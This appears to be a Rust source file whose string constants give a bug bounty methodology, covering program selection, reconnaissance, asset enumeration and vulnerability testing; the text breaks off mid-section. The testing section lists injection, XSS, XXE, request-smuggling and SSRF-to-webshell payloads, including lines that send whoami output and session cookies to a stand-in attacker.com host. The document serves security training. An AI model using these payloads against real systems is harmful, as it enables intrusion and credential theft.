// Bug Bounty Hunting Phase - Comprehensive methodology for ethical hacking programs
// Based on OWASP Bug Bounty Guide, HackerOne/Bugcrowd best practices, and ISO 29147

use crate::model::{Phase, Step};
use uuid::Uuid;

pub const STEPS: &[(&str, &str)] = &[
    (
        "Program selection & reconnaissance",
        "OBJECTIVE: Identify and evaluate bug bounty programs that align with your skills, select high-quality targets, and conduct initial reconnaissance to understand program scope and assets.

ACADEMIC BACKGROUND:
ISO 29147 specifies vulnerability disclosure procedures. The NIST Cybersecurity Framework emphasizes coordinated vulnerability disclosure. HackerOne's 2024 Hacker Report shows average bounty of $4,000-$6,000 for high-severity findings. Bugcrowd University provides platform-specific training (https://www.bugcrowd.com/hackers/bugcrowd-university/). OWASP Bug Bounty Guide outlines program selection criteria.

STEP-BY-STEP PROCESS:

1. Bug Bounty Platform Selection:

Major Platforms:
- HackerOne (https://hackerone.com/) - Largest platform, 3,000+ programs, PayPal/Uber/US DoD
- Bugcrowd (https://bugcrowd.com/) - 1,500+ programs, Tesla/OpenAI/Mastercard
- Intigriti (https://intigriti.com/) - European focus, 500+ programs, GDPR-compliant
- YesWeHack (https://yeswehack.com/) - French platform, government programs
- Synack (https://www.synack.com/) - Invite-only, vetted researchers
- Open Bug Bounty (https://openbugbounty.org/) - Non-paying, responsible disclosure
- HackenProof (https://hackenproof.com/) - Crypto/blockchain focus

Platform Comparison Criteria:
```bash
# Check platform statistics
curl https://hackerone.com/directory/programs | jq '.[] | {name, avg_bounty, response_time}'

# Review leaderboards for active hunters
open https://bugcrowd.com/leaderboard
open https://hackerone.com/leaderboard

# Platform fee structures
HackerOne: 20% platform fee on bounties
Bugcrowd: Varies by program
Intigriti: 15-25% platform fee
```

2. Program Evaluation and Selection:

Key Evaluation Metrics:
- Response Time: Average first response (hours/days)
- Resolution Time: Average time to bounty payment
- Bounty Range: Minimum to maximum payouts by severity
- Scope Clarity: Well-defined in-scope/out-of-scope assets
- Program Maturity: New programs vs. established (3+ years)
- Hall of Fame: Public recognition opportunities

Program Types:
```text
PUBLIC PROGRAMS:
+ Open to all researchers
+ Higher competition
+ Faster triage (dedicated security team)
+ Better payouts (mature programs)
- More duplicates
- Picked-over targets

PRIVATE PROGRAMS:
+ Invitation-only access
+ Lower competition
+ Less picked-over assets
+ Higher signal-to-noise ratio
- Requires reputation to access
- Fewer available programs

VDP (Vulnerability Disclosure Programs):
+ No financial rewards
+ Good for beginners (practice)
+ Build reputation and portfolio
+ Less competitive
- Time investment without payment
```

3. Scope Analysis (Critical Step):

In-Scope Asset Types:
```text
✓ *.example.com (wildcard subdomains)
✓ example.com main domain
✓ mobile.example.com specific subdomain
✓ iOS/Android mobile applications
✓ api.example.com API endpoints
✓ Third-party integrations (if specified)

✗ Out-of-scope (NEVER TEST):
✗ example.net different TLD
✗ Physical security testing
✗ Social engineering attacks
✗ Denial of Service (DoS/DDoS)
✗ Third-party services (unless specified)
✗ Spam or content injection
```

Vulnerability Scope Analysis:
```bash
# Download program policy
wget https://hackerone.com/example-company/policy -O policy.html

# Parse scope sections
grep -A 20 \"In Scope\" policy.html
grep -A 20 \"Out of Scope\" policy.html

# Check severity classifications
grep -i \"critical\" policy.html | head -5
grep -i \"high\" policy.html | head -5
```

Common Scope Restrictions:
- Self-XSS: Usually out-of-scope (requires social engineering)
- Clickjacking: Often low severity or informational
- SPF/DMARC records: Depends on program
- SSL/TLS misconfigurations: Usually informational
- Rate limiting issues: Low priority
- Descriptive error messages: Informational
- Missing cookie flags: Low severity

4. Asset Discovery and Initial Reconnaissance:

Domain and Subdomain Collection:
```bash
# From program scope
echo \"example.com\" > targets.txt
echo \"*.example.com\" >> targets.txt

# Certificate Transparency logs
curl -s \"https://crt.sh/?q=%.example.com&output=json\" | jq -r '.[].name_value' | sort -u > subdomains.txt

# SecurityTrails API
curl \"https://api.securitytrails.com/v1/domain/example.com/subdomains\" \\
  -H \"APIKEY: YOUR_API_KEY\" | jq -r '.subdomains[]' | sed 's/$/\\.example.com/' >> subdomains.txt

# VirusTotal API
curl \"https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=YOUR_API_KEY\" \\
  | jq -r '.subdomains[]' >> subdomains.txt

# Remove duplicates
sort -u subdomains.txt -o subdomains_unique.txt
```

5. Program Reputation and History Research:

Check Program Statistics:
```bash
# HackerOne program stats
curl https://hackerone.com/example-company/reports | grep -E \"(resolved|bounty_awarded|response_time)\"

# Search for disclosed reports
open https://hackerone.com/example-company/hacktivity

# Bugcrowd program page
open https://bugcrowd.com/example-company

# Check Twitter for researcher feedback
# Search: \"example-company bug bounty\" OR \"@examplecompany security\"
```

Red Flags (Programs to Avoid):
```text
🚩 No responses for 30+ days
🚩 Frequent \"Won't Fix\" or \"Informative\" closures
🚩 Very low bounty ranges ($50 for critical)
🚩 Unclear or constantly changing scope
🚩 Poor communication from security team
🚩 No disclosed reports (may indicate payment issues)
🚩 Negative researcher reviews
🚩 Unrealistic expectations in policy
```

Green Flags (Quality Programs):
```text
✓ Average response time < 24 hours
✓ Clear escalation process
✓ Public Hall of Fame
✓ Disclosed vulnerability reports
✓ Fair duplicate handling
✓ Reasonable bounty ranges
✓ Active security team engagement
✓ Quick time to resolution
✓ Positive community feedback
```

6. Initial Reconnaissance Strategy:

Asset Prioritization:
```text
HIGH PRIORITY TARGETS:
1. Authentication systems (login, SSO, OAuth)
2. Payment processing endpoints
3. Admin panels and privileged functionality
4. API endpoints (especially v1/legacy)
5. File upload functionality
6. Password reset mechanisms

MEDIUM PRIORITY:
7. User profile management
8. Search functionality
9. Content management systems
10. Public-facing APIs
11. Mobile applications
12. Third-party integrations

LOW PRIORITY:
13. Marketing websites
14. Static content pages
15. CDN resources
16. Help/documentation sites
```

Technology Stack Identification:
```bash
# Wappalyzer for web technologies
npm install -g wappalyzer
wappalyzer https://example.com

# WhatWeb for framework detection
whatweb -a 3 https://example.com

# Retire.js for JavaScript library vulnerabilities
retire --js --jspath https://example.com

# Check HTTP headers
curl -I https://example.com | grep -E \"(Server|X-Powered-By|X-AspNet-Version)\"
```

7. Program Communication and Onboarding:

Best Practices for First Contact:
```text
✓ Read ENTIRE security policy before testing
✓ Join program Slack/Discord if available
✓ Introduce yourself (professional, brief)
✓ Ask clarifying questions about scope
✓ Request access to private documentation
✓ Understand preferred reporting format
✓ Clarify duplicate handling policy
✓ Ask about testing constraints (rate limits, test accounts)
```

Questions to Ask Security Team:
```text
1. \"Are test accounts available for authenticated testing?\"
2. \"What is the policy on subdomain enumeration scanning?\"
3. \"Can I test [specific feature] that's not explicitly mentioned?\"
4. \"What's the expected triage timeline for submitted reports?\"
5. \"Is there a preferred severity classification system?\"
6. \"Are there any current focus areas or high-priority assets?\"
```

WHAT TO LOOK FOR:
- **Well-Defined Scope**: Clear in-scope assets with examples (*.example.com vs example.com)
- **Fair Bounty Ranges**: Critical ($5K-$20K), High ($2K-$5K), Medium ($500-$2K), Low ($100-$500)
- **Response Metrics**: First response < 48 hours, triage < 5 days, payment < 30 days
- **Disclosed Reports**: Public disclosure of past findings (transparency indicator)
- **Active Security Team**: Regular updates, clear communication, responsive to questions
- **Mature Program**: 1+ year old, 50+ resolved reports, established processes
- **Community Reputation**: Positive reviews from other researchers, Hall of Fame

SECURITY IMPLICATIONS:
- **Legal Protection**: Bug bounty safe harbor protects researchers under CFAA (Computer Fraud and Abuse Act)
- **Scope Violations**: Testing out-of-scope assets can result in legal action or platform bans
- **Responsible Disclosure**: Coordinated disclosure timelines (typically 90 days) per ISO 29147
- **Data Handling**: Never exfiltrate customer data, use test accounts, avoid PII exposure
- **Platform Rules**: Violation of platform terms can result in account suspension

COMMON PITFALLS:
- **Scope Creep**: Testing out-of-scope assets because \"they're related\" - ALWAYS stay in scope
- **Insufficient Research**: Submitting duplicates because you didn't check disclosed reports
- **Poor Program Selection**: Choosing low-quality programs with poor response times or payment issues
- **Overly Broad Scanning**: Aggressive scanning causing service disruption (rate limit yourself)
- **Skipping Policy**: Not reading the full security policy and missing critical restrictions
- **No Test Accounts**: Testing on production with real user data instead of requesting test accounts
- **Ignoring Red Flags**: Continuing with programs showing poor triage or payment patterns
- **Tutorial Hell**: Spending too much time researching instead of actually testing

TOOLS REFERENCE:
- **HackerOne**: https://hackerone.com/ (bug bounty platform)
- **Bugcrowd**: https://bugcrowd.com/ (bug bounty platform)
- **Intigriti**: https://intigriti.com/ (European platform)
- **crt.sh**: https://crt.sh/ (Certificate Transparency logs)
- **SecurityTrails**: https://securitytrails.com/ (DNS/subdomain intelligence)
- **Wappalyzer**: https://www.wappalyzer.com/ (technology profiling)
- **Shodan**: https://shodan.io/ (internet-wide scanning)
- **Censys**: https://censys.io/ (internet asset discovery)

FURTHER READING:
- Bugcrowd University: https://www.bugcrowd.com/hackers/bugcrowd-university/
- HackerOne Resources: https://docs.hackerone.com/researchers/
- OWASP Bug Bounty Guide: https://owasp.org/www-community/Vulnerability_Disclosure_Cheat_Sheet
- ISO 29147 Vulnerability Disclosure: https://www.iso.org/standard/72311.html
- Researcher Best Practices: https://www.hackerone.com/ethical-hacker/best-practices
- Bug Bounty Methodology by Jason Haddix: https://github.com/jhaddix/tbhm"
    ),
    (
        "Asset enumeration & mapping",
        "OBJECTIVE: Comprehensively enumerate and map target assets including domains, subdomains, APIs, mobile applications, and third-party integrations to identify high-value attack surface.

ACADEMIC BACKGROUND:
OWASP WSTG v4.2 Section 4.1 covers information gathering. PTES Technical Guidelines emphasize attack surface mapping. Jason Haddix's Bug Bounty Hunting Methodology (https://github.com/jhaddix/tbhm) provides comprehensive asset discovery techniques. MITRE ATT&CK T1590 covers reconnaissance gathering victim network information.

STEP-BY-STEP PROCESS:

1. Comprehensive Subdomain Enumeration:

Passive Subdomain Discovery:
```bash
# Certificate Transparency (crt.sh)
curl -s \"https://crt.sh/?q=%.example.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crt_subdomains.txt

# Subfinder (passive aggregator)
subfinder -d example.com -all -recursive -o subfinder_results.txt

# Amass passive mode
amass enum -passive -d example.com -o amass_passive.txt

# SecurityTrails API
curl \"https://api.securitytrails.com/v1/domain/example.com/subdomains\" \\
  -H \"APIKEY: YOUR_KEY\" | jq -r '.subdomains[]' | sed 's/$/\\.example.com/' > securitytrails.txt

# VirusTotal subdomains
curl \"https://www.virustotal.com/vtapi/v2/domain/report?apikey=YOUR_KEY&domain=example.com\" \\
  | jq -r '.subdomains[]?' > virustotal.txt

# Shodan search
shodan search \"hostname:example.com\" --fields hostnames | tr ',' '\\n' > shodan_hosts.txt

# Censys certificates
censys search \"parsed.names: example.com\" | jq -r '.[] | .parsed.names[]' > censys.txt
```

Active Subdomain Discovery:
```bash
# DNS brute-forcing with wordlist
puredns bruteforce subdomains.txt example.com -r resolvers.txt -w puredns_results.txt

# Gobuster DNS mode
gobuster dns -d example.com -w ~/wordlists/subdomains-top1million-110000.txt -o gobuster_dns.txt

# MassDNS with large wordlist
massdns -r resolvers.txt -t A -o S subdomains.txt > massdns_output.txt

# Shuffledns for resolution
shuffledns -d example.com -w subdomains.txt -r resolvers.txt -o resolved.txt

# DNSx for validation and additional info
cat all_subdomains.txt | dnsx -resp -a -aaaa -cname -ns -mx -soa -txt -o dnsx_results.txt
```

DNS Permutation and Alteration:
```bash
# Altdns for permutations
altdns -i subdomains.txt -o altdns_output.txt -w ~/wordlists/words.txt

# Gotator for advanced permutations
gotator -sub subdomains.txt -perm ~/wordlists/permutations.txt -depth 2 -o gotator_out.txt

# Common patterns to check manually
for sub in admin api dev staging test beta prod backup old new www2 www3; do
    echo \"${sub}.example.com\"
done
```

2. Port Scanning and Service Discovery:

HTTP/HTTPS Service Discovery:
```bash
# HTTPx for live web services
cat subdomains.txt | httpx -ports 80,443,8080,8443,8000,8888 -threads 100 \\
  -status-code -title -tech-detect -o httpx_results.txt

# Aquatone for screenshots
cat live_hosts.txt | aquatone -out aquatone_output/

# EyeWitness for visual reconnaissance
eyewitness --web -f live_hosts.txt --no-prompt -d eyewitness_output/
```

Comprehensive Port Scanning:
```bash
# Nmap SYN scan on top ports
nmap -sS -T4 --top-ports 1000 -iL subdomains.txt -oA nmap_top1000

# Nmap full port scan (be careful with rate limiting)
nmap -sS -T3 -p- --max-rate 1000 target.example.com -oA nmap_full

# Masscan for fast port discovery
masscan -iL targets.txt -p1-65535 --rate 1000 -oL masscan_output.txt

# Naabu for fast port scanning
naabu -l targets.txt -top-ports 1000 -o naabu_ports.txt
```

3. Technology Stack Fingerprinting:

Web Application Technologies:
```bash
# Wappalyzer via CLI
wappalyzer https://example.com -o wappalyzer.json

# Webanalyze for technology detection
webanalyze -host https://example.com -output json

# WhatWeb comprehensive analysis
whatweb -a 3 https://example.com --log-json=whatweb.json

# Retire.js for vulnerable JavaScript libraries
retire --js --jspath https://example.com --outputformat json

# Check HTTP headers for technology hints
curl -I https://example.com | grep -iE \"(server|x-powered-by|x-aspnet|x-framework)\"

# Detect CMS
cmseek -u https://example.com

# WordPress version detection
curl -s https://example.com/readme.html | grep -i \"version\"
wpscan --url https://example.com --enumerate vp --api-token YOUR_TOKEN
```

Backend Framework Identification:
```bash
# Common framework indicators
# Laravel: check for /storage, /vendor paths
curl -s https://example.com/storage/logs/laravel.log

# Django: look for /admin, /static/admin paths
curl -I https://example.com/admin/ | grep -i \"csrf\"

# Ruby on Rails: check for .json extensions
curl https://example.com/users.json

# ASP.NET: look for .aspx extensions, __VIEWSTATE
curl https://example.com | grep -i \"__VIEWSTATE\"

# Node.js: check for Express headers
curl -I https://example.com | grep -i \"X-Powered-By: Express\"

# PHP version disclosure
curl -I https://example.com | grep \"X-Powered-By: PHP\"
```

4. API Discovery and Documentation:

Endpoint Discovery:
```bash
# Common API paths
for path in api v1 v2 v3 rest graphql swagger swagger-ui api-docs openapi.json; do
    curl -s \"https://example.com/${path}\" -o \"${path}.txt\"
done

# API documentation endpoints
curl https://example.com/api/swagger.json
curl https://example.com/api/openapi.yaml
curl https://example.com/api-docs
curl https://example.com/docs
curl https://example.com/graphql (POST with introspection query)

# Kiterunner for API bruteforcing
kr scan https://example.com -w routes-large.kite -o kiterunner_results.txt

# FFUF for API endpoint discovery
ffuf -u https://example.com/api/FUZZ -w api-endpoints.txt -mc 200,301,302,401,403

# Arjun for parameter discovery
arjun -u https://example.com/api/users -m GET,POST
```

GraphQL Enumeration:
```bash
# GraphQL introspection query
curl -X POST https://example.com/graphql \\
  -H \"Content-Type: application/json\" \\
  -d '{\"query\": \"{__schema{types{name,fields{name}}}}\"}'

# GraphQL Voyager for visualization
# Use https://apis.guru/graphql-voyager/

# GraphQL playground discovery
curl https://example.com/graphql
curl https://example.com/___graphql
```

5. Mobile Application Analysis:

iOS Application Enumeration:
```bash
# Download IPA from App Store (requires Apple ID)
# Use ipatool: ipatool download -b com.example.app

# Extract IPA
unzip Example.ipa -d extracted/

# Strings analysis for endpoints
strings extracted/Payload/Example.app/Example | grep -iE \"(https?://|api|endpoint)\"

# Class-dump for Objective-C headers
class-dump Example.app/Example > headers.txt

# Plist analysis
plutil -p extracted/Payload/Example.app/Info.plist

# MobSF for automated analysis
# Upload IPA to https://mobsf.live or local instance
```

Android Application Analysis:
```bash
# Download APK (use apkeep, apkpure-downloader, or device)
apkeep -a com.example.app .

# Decompile APK
apktool d example.apk -o decompiled/

# Jadx for Java decompilation
jadx example.apk -d jadx_output/

# Strings for endpoint discovery
strings example.apk | grep -iE \"(https?://|api\\.example\\.com)\" > endpoints.txt

# AndroidManifest.xml analysis
cat decompiled/AndroidManifest.xml | grep -E \"(activity|service|receiver|provider)\"

# MobSF analysis
# Upload to MobSF instance for comprehensive scan

# Frida for dynamic analysis
frida -U -f com.example.app -l intercept.js
```

6. Third-Party Integration Discovery:

JavaScript Analysis:
```bash
# Extract all JavaScript files
wget -r -l 1 -A js https://example.com/

# Link Finder for endpoint discovery
python3 linkfinder.py -i https://example.com -o linkfinder_results.txt

# JSParser for parsing JS files
python3 jsparser.py -f app.js

# Search for API keys and secrets
grep -rE \"(api[_-]?key|apikey|access[_-]?token|secret[_-]?key)\" .

# Third-party services in JS
grep -rohE \"https?://[^\"']+\" *.js | sort -u | grep -vE \"(example\\.com|jquery|google-analytics)\"
```

External Services and Integrations:
```text
Common Third-Party Integrations to Check:
- AWS S3 buckets: s3.amazonaws.com/bucket-name
- Azure Blob Storage: accountname.blob.core.windows.net
- Google Cloud Storage: storage.googleapis.com/bucket-name
- CDN: CloudFlare, Akamai, Fastly
- Payment processors: Stripe, PayPal, Braintree
- Analytics: Google Analytics, Mixpanel, Segment
- CRM: Salesforce, HubSpot, Zendesk
- Email: SendGrid, Mailgun, Amazon SES
- Chat: Intercom, Drift, Zendesk Chat
- Authentication: Auth0, Okta, Firebase Auth
```

S3 Bucket Enumeration:
```bash
# Common S3 bucket naming patterns
for name in example example-prod example-dev example-staging example-backup example-assets; do
    aws s3 ls s3://${name} --no-sign-request
    curl -I https://${name}.s3.amazonaws.com/
done

# S3Scanner for automated discovery
python3 s3scanner.py --bucket example

# Bucket permissions testing
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request
```

7. Attack Surface Mapping and Prioritization:

Visual Attack Surface Mapping:
```bash
# Aquatone for visual clustering
cat live_hosts.txt | aquatone -ports xlarge

# Gowitness for screenshots
gowitness file -f live_hosts.txt --destination gowitness_screenshots/

# Create mind map of assets (manual or tools)
# Use XMind, FreeMind, or draw.io
```

Asset Categorization:
```text
HIGH-VALUE ASSETS:
1. Authentication endpoints (login, SSO, OAuth)
2. Admin panels (/admin, /administrator, /wp-admin)
3. API endpoints (especially versioned like /api/v1)
4. File upload functionality
5. Payment processing pages
6. Password reset mechanisms
7. Account management features
8. Database admin interfaces (phpMyAdmin, Adminer)

MEDIUM-VALUE ASSETS:
9. User profile pages
10. Search functionality
11. Contact forms
12. Public APIs with authentication
13. Third-party integrations
14. Mobile applications
15. Legacy/old versions (v1 when v2 exists)

LOW-VALUE ASSETS:
16. Static marketing pages
17. CDN resources
18. Help/documentation sites
19. Blog/news sections
20. Public-facing read-only content
```

Asset Database Creation:
```bash
# Create structured asset database
cat > assets_db.json << 'EOF'
{
  \"domains\": [],
  \"subdomains\": [],
  \"ips\": [],
  \"ports\": [],
  \"technologies\": [],
  \"apis\": [],
  \"mobile_apps\": [],
  \"third_party\": [],
  \"high_value_targets\": []
}
EOF

# Merge all enumeration results
cat crt_subdomains.txt subfinder_results.txt amass_passive.txt | sort -u > all_subdomains.txt

# Resolve to IPs
cat all_subdomains.txt | dnsx -a -resp-only > ips.txt

# Live HTTP/HTTPS hosts
cat all_subdomains.txt | httpx -silent > live_hosts.txt
```

WHAT TO LOOK FOR:
- **Forgotten Subdomains**: dev.example.com, staging.example.com, old.example.com with outdated software
- **Legacy APIs**: /api/v1 endpoints when v2/v3 exist (often less protected)
- **Admin Interfaces**: /admin, /administrator, /manage, /control-panel with weak authentication
- **Cloud Storage**: Open S3 buckets, Azure blob containers, Google Cloud Storage with public access
- **Exposed Databases**: MongoDB, Redis, Elasticsearch without authentication
- **Development Artifacts**: .git directories, .env files, config backups, API documentation
- **Mobile App Secrets**: Hardcoded API keys, tokens, endpoints in mobile applications

SECURITY IMPLICATIONS:
- **Expanded Attack Surface**: More assets = more potential vulnerabilities
- **Third-Party Risk**: Vulnerabilities in integrated services affect main application
- **Supply Chain**: Compromised third-party libraries or services (Log4Shell, SolarWinds)
- **Shadow IT**: Unknown or forgotten assets without security monitoring
- **Data Exposure**: Misconfigured cloud storage exposing sensitive data

COMMON PITFALLS:
- **Noisy Scanning**: Aggressive scanning triggering WAF/IDS alerts and getting blocked
- **Missing Subdomains**: Only checking Certificate Transparency, missing DNS brute-force findings
- **Ignoring Mobile Apps**: Focusing only on web, missing iOS/Android attack surface
- **No Rate Limiting**: Hitting APIs too fast causing disruption (use --rate-limit flags)
- **Outdated Wordlists**: Using small wordlists missing modern naming conventions
- **No Validation**: Finding subdomains but not verifying they're live or in-scope
- **Incomplete Tech Stack**: Missing backend frameworks leading to incomplete testing methodology
- **Poor Organization**: No structured database of findings, losing track of assets

TOOLS REFERENCE:
- **Subfinder**: https://github.com/projectdiscovery/subfinder (passive subdomain discovery)
- **Amass**: https://github.com/OWASP/Amass (comprehensive asset discovery)
- **HTTPx**: https://github.com/projectdiscovery/httpx (HTTP toolkit)
- **Naabu**: https://github.com/projectdiscovery/naabu (fast port scanner)
- **Aquatone**: https://github.com/michenriksen/aquatone (visual reconnaissance)
- **MobSF**: https://github.com/MobSF/Mobile-Security-Framework-MobSF (mobile security)
- **Kiterunner**: https://github.com/assetnote/kiterunner (API discovery)
- **LinkFinder**: https://github.com/GerbenJavado/LinkFinder (endpoint discovery in JS)

FURTHER READING:
- Jason Haddix TBHM: https://github.com/jhaddix/tbhm
- OWASP WSTG Information Gathering: https://owasp.org/www-project-web-security-testing-guide/
- ProjectDiscovery Blog: https://blog.projectdiscovery.io/
- Bug Bounty Bootcamp by Vickie Li: Chapter 4 - Environmental Setup and Traffic Interception
- Nahamsec Recon Methodology: https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters"
    ),
    (
        "Vulnerability research & testing",
        "OBJECTIVE: Apply systematic testing methodologies to discover high-impact vulnerabilities, focusing on creative attack chains and business logic flaws that automated tools miss.

ACADEMIC BACKGROUND:
OWASP Testing Guide v4.2 provides comprehensive web application testing methodology. PortSwigger Web Security Academy (https://portswigger.net/web-security) offers hands-on vulnerability research training. SANS Penetration Testing describes manual testing approaches. Bug Bounty Playbook by Vickie Li emphasizes creative testing techniques. MITRE ATT&CK Framework T1190 covers exploitation of public-facing applications.

STEP-BY-STEP PROCESS:

1. Manual Vulnerability Testing Methodology:

Authentication Testing:
```bash
# SQL injection in login
username: admin' OR '1'='1' --
password: anything

# NoSQL injection
username[$ne]=admin&password[$ne]=password

# LDAP injection
username: *)(uid=*))(|(uid=*
password: anything

# XML injection in SAML
<saml:NameID>admin</saml:NameID> to <saml:NameID>admin</saml:NameID><saml:Attribute>admin</saml:Attribute>

# JWT token manipulation
# Decode JWT at jwt.io
# Change \"role\": \"user\" to \"role\": \"admin\"
# Try algorithm confusion: change alg to \"none\"
jwt-tool token.jwt -T

# OAuth misconfiguration
# Check redirect_uri manipulation
https://oauth.com/authorize?redirect_uri=https://attacker.com
# Test for token leakage in Referer header
```

Authorization and Access Control:
```bash
# IDOR (Insecure Direct Object Reference)
# Change user IDs in URLs
GET /api/users/123/profile → /api/users/124/profile
GET /api/orders/1000 → /api/orders/1001

# Parameter pollution
GET /api/user?id=123&id=124 (might return user 124)

# HTTP verb tampering
# If POST /api/users/123 is protected, try:
GET /api/users/123
PUT /api/users/123
DELETE /api/users/123
PATCH /api/users/123

# Path traversal for authorization bypass
/api/users/../admin/settings
/api/v1/users/123 → /api/v2/users/123 (different version)

# Forced browsing
/admin (redirect to login)
/admin/settings (might be accessible without /admin check)

# Check for horizontal privilege escalation
# User A accessing User B's resources via parameter manipulation
```

Injection Vulnerabilities:
```bash
# SQL injection testing
# Error-based
' OR 1=1--
\" OR \"\"=\"
') OR ('x'='x

# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,email FROM users--

# Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

# Second-order SQL injection
# Register username: admin'-- 
# Later query: UPDATE users SET email='new@mail.com' WHERE username='admin'--'

# Command injection
; ls -la
| cat /etc/passwd
`whoami`
$(curl http://attacker.com/$(whoami))

# XML External Entity (XXE)
<?xml version=\"1.0\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>&xxe;</root>

# Server-Side Template Injection (SSTI)
{{7*7}} (Jinja2/Flask)
${7*7} (Freemarker/Spring)
<%= 7*7 %> (ERB/Ruby)
```

Cross-Site Scripting (XSS):
```bash
# Reflected XSS
?search=<script>alert(document.domain)</script>
?name=<img src=x onerror=alert(1)>

# Stored XSS in profile/comments
<svg/onload=alert(1)>
<body/onload=fetch('http://attacker.com/?c='+document.cookie)>

# DOM-based XSS
# Check JavaScript that uses user input
document.getElementById('output').innerHTML = location.hash.slice(1);
# Payload: #<img src=x onerror=alert(1)>

# XSS in JSON responses
{\"name\":\"<script>alert(1)</script>\"}

# Bypass filters
<ScRiPt>alert(1)</sCrIpT> (case variation)
<img src=x onerror=\"alert(1)\"> (alternative tags)
<svg><animate onbegin=alert(1)> (SVG tags)
```

2. Business Logic Vulnerability Discovery:

E-Commerce Logic Flaws:
```bash
# Race conditions in payment
# Send multiple simultaneous requests to apply discount twice
for i in {1..10}; do
  curl -X POST https://example.com/api/apply-coupon -d \"code=DISCOUNT50\" &
done

# Price manipulation
POST /api/cart/checkout
{\"item_id\": 123, \"quantity\": 1, \"price\": 0.01}

# Negative quantity bypass
{\"item_id\": 123, \"quantity\": -1} (might give refund)

# Currency rounding errors
# Test with: 0.004, 0.005, 0.006 in prices

# Gift card/coupon abuse
# Apply same coupon multiple times
# Use expired coupons by changing client-side date
```

Authentication and Session Logic:
```bash
# Password reset token reuse
# Use same token multiple times
# Token not invalidated after use

# 2FA bypass techniques
# Complete login, intercept 2FA page, directly access /dashboard
# Null or empty 2FA code
2fa_code= (empty)
2fa_code=000000 (default)
2fa_code=null

# Session fixation
# Attacker provides session ID to victim before login
# After victim logs in, attacker uses same session

# Remember me token manipulation
# Decode remember_me cookie
# Change user_id, re-encode, test
```

Rate Limiting and Anti-Automation:
```bash
# Rate limit bypass techniques
# IP rotation via X-Forwarded-For
curl -H \"X-Forwarded-For: 1.2.3.4\" https://example.com/api/endpoint

# User-Agent rotation
while read ua; do
  curl -A \"$ua\" https://example.com/api/endpoint
done < user_agents.txt

# Null byte in parameters
username=admin%00extra

# Case sensitivity bypass
/API/endpoint instead of /api/endpoint

# HTTP verb bypass
If POST is rate-limited, try GET, PUT, PATCH
```

3. Automated Vulnerability Scanning:

Web Application Scanners:
```bash
# Nuclei with templates
nuclei -l targets.txt -t ~/nuclei-templates/ -severity critical,high

# Burp Suite Professional active scan
# 1. Proxy traffic through Burp
# 2. Right-click target → \"Scan\"
# 3. Configure scan: Audit checks, Crawl depth

# OWASP ZAP automated scan
zap-cli quick-scan -s all --spider -r https://example.com

# SQLMap for SQL injection
sqlmap -u \"https://example.com/search?q=test\" --batch --random-agent

# XSStrike for XSS
python3 xsstrike.py -u \"https://example.com/search?q=test\"

# Dalfox for XSS hunting
dalfox url https://example.com/search?keyword=test

# Nikto web server scan
nikto -h https://example.com -Tuning 123456789
```

API-Specific Testing:
```bash
# API fuzzing with ffuf
ffuf -u https://example.com/api/FUZZ -w api-endpoints.txt -mc 200,500

# REST API testing
# Test HTTP methods: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS
curl -X OPTIONS https://example.com/api/users

# GraphQL testing
# Introspection query
curl -X POST https://example.com/graphql \\
  -H \"Content-Type: application/json\" \\
  -d '{\"query\": \"{__schema{types{name}}}\"}'

# GraphQL mutation testing
mutation { deleteUser(id: \"123\") { success } }

# API parameter pollution
/api/users?id=1&id=2
/api/users?id=1&role=admin
```

Content Discovery:
```bash
# Directory bruteforcing
ffuf -u https://example.com/FUZZ -w ~/wordlists/raft-medium-directories.txt

# File discovery
ffuf -u https://example.com/FUZZ -w ~/wordlists/raft-medium-files.txt -e .php,.txt,.bak,.old

# Feroxbuster recursive scan
feroxbuster -u https://example.com -w ~/wordlists/directory-list-2.3-medium.txt -x php,txt,bak

# Gobuster with extensions
gobuster dir -u https://example.com -w ~/wordlists/common.txt -x php,html,txt,bak -t 50

# Dirsearch
dirsearch -u https://example.com -e php,txt,bak -w ~/wordlists/common.txt
```

4. Vulnerability Chaining Techniques:

Common Vulnerability Chains:
```text
CHAIN 1: SSRF → Internal Service Access → RCE
1. Find SSRF in image upload/URL fetch feature
2. Access internal services (http://localhost:6379 Redis)
3. Execute Redis commands for RCE
   url=http://127.0.0.1:6379/
   POST: \"CONFIG SET dir /var/www/html\\r\\nCONFIG SET dbfilename shell.php\"

CHAIN 2: XSS → Session Hijacking → Account Takeover
1. Find stored XSS in user profile
2. Inject cookie stealer: <img src=x onerror='fetch(\"//attacker.com/?c=\"+document.cookie)'>
3. Steal admin session cookie
4. Access admin panel with stolen session

CHAIN 3: IDOR → Information Disclosure → Privilege Escalation
1. Find IDOR in /api/users/{id}
2. Enumerate all user profiles including admins
3. Discover admin password reset tokens in API response
4. Use token to reset admin password

CHAIN 4: File Upload → Path Traversal → RCE
1. Upload file with path traversal: ../../shell.php
2. File saved outside upload directory
3. Access shell at https://example.com/shell.php

CHAIN 5: Open Redirect → OAuth Token Theft
1. Find open redirect: /redirect?url=https://evil.com
2. Craft OAuth authorization URL with redirect
3. Victim clicks, OAuth redirects to evil.com with access token
```

Advanced Attack Techniques:
```bash
# SSRF with DNS rebinding
# Point domain to 127.0.0.1, then change DNS to external IP
# Bypass SSRF filters checking initial DNS

# Polyglot payloads
# XSS + SQLi combined
jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e

# HTTP request smuggling
# CL.TE (Content-Length vs Transfer-Encoding)
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /admin HTTP/1.1
...

# Second-order vulnerabilities
# 1. Store malicious payload (username: <script>alert(1)</script>)
# 2. Trigger in another context (admin views user list)
```

5. Manual Code Review (When Source Available):

Dangerous Functions to Search:
```bash
# PHP dangerous functions
grep -r \"eval(\" .
grep -r \"exec(\" .
